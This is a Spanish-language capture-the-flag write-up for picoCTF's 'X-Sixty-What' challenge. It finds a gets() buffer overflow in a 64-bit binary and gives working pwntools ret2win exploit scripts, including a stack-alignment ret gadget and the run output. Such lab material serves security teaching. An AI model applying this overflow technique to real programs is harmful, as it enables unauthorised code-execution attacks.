# X-Sixty-What

```c
file vuln
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8ba2226f06946bc75922ba6fb1919e6283162f22, for GNU/Linux 3.2.0, not stripped
```

```c
checksec --file=vuln             
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH        Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   74 Symbols        No    0               3               vuln
```

```c
./vuln               
Welcome to 64-bit. Give me a string that gets you the flag: 
hola
```

Este binario nos pide un input usando el método gets() con el cual podemos desbordar el buffer.

```c
void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}
```

El binario tiene una función flag que imprime la flag

```c
void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  fgets(buf,FLAGSIZE,f);
  printf(buf);
}
```

Claramente estamos ante un Ret2Win así que vamos a hacer un script que automáticamente detecte el offset y que mande la direccion al rip de la funcion flag

```python
from pwn import *
exe = ELF("./vuln_patched")
context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 51011)
    return r

def find_ip(payload):
    p = process([exe.path])
    p.sendlineafter(b':', payload)
    p.wait()
    #ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

def main():
    offset = find_ip(cyclic(500)) # Mandamos el patrón a la función find_ip que calcula el offset
    r = conn()
    payload = flat({
        offset: [
            exe.symbols.flag
        ]
    })
    r.sendlineafter(b"flag:", payload)
    r.interactive()

if __name__ == "__main__":
    main()
```

Este script funciona en local pero en remoto no. Esto pasa porque al hacer el salto a flag el stack se queda desalineado, esto se puede arreglar haciendo que, antes de saltar a flag, saltemos a un simple gadget `ret`

```python
from pwn import *
exe = ELF("./vuln_patched")
context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 51011)
    return r

def find_ip(payload):
    p = process([exe.path])
    p.sendlineafter(b':', payload)
    p.wait()
    #ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

def main():
    offset = find_ip(cyclic(500)) # Mandamos el patrón a la función find_ip que calcula el offset
    r = conn()
    ret = ROP(exe).find_gadget(['ret'])[0] # Busca un gadget ret
    payload = flat({
        offset: [
            ret, # Stack desalineado
            exe.symbols.flag
        ]
    })
    r.sendlineafter(b"flag:", payload)
    r.interactive()

if __name__ == "__main__":
    main()
```

```bash
python solve.py
[*] '/home/ub1cu0/Desktop/picoCTF/x-sixty-what/vuln_patched'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Starting local process '/home/ub1cu0/Desktop/picoCTF/x-sixty-what/vuln_patched': pid 205282
[*] Process '/home/ub1cu0/Desktop/picoCTF/x-sixty-what/vuln_patched' stopped with exit code -11 (SIGSEGV) (pid 205282)
[+] Parsing corefile...: Done
[*] '/home/ub1cu0/Desktop/picoCTF/x-sixty-what/core.205282'
    Arch:      amd64-64-little
    RIP:       0x4012d1
    RSP:       0x7fff7cb1eed8
    Exe:       '/home/ub1cu0/Desktop/picoCTF/x-sixty-what/vuln_patched' (0x400000)
    Fault:     0x6161617461616173
[*] located EIP/RIP offset at 72
[+] Opening connection to saturn.picoctf.net on port 51011: Done
[*] Loaded 14 cached gadgets for './vuln_patched'
[*] Switching to interactive mode
 
picoCTF{SECRETO}[*] Got EOF while reading in interactive
```
